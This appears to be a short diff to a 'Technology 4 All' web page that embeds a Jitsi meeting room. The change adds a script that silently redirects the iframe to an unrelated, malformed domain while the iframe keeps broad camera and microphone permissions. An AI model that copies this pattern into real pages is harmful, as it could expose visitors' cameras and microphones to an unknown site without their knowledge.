@@ -25,6 +25,10 @@ title: Technology 4 All
     };
   const api = new JitsiMeetExternalAPI(domain, options);
   </script>
-  <iframe allow="camera *;microphone *;fullscreen *;autoplay *" src="https://meet.jit.si/twishasampleroom2" width="800" height="640" frameborder="0" marginheight="0" marginwidth="0">Loading…</iframe>
+  <iframe id="conf" allow="camera *;microphone *;fullscreen *;autoplay *" src="https://meet.jit.si/twishasampleroom2" width="800" height="640" frameborder="0" marginheight="0" marginwidth="0">Loading…</iframe>
+  <script>
+    el=document.getElementById("conf");
+    el.src="https://ayeai.xyx";
+  </script>
 </div>
 
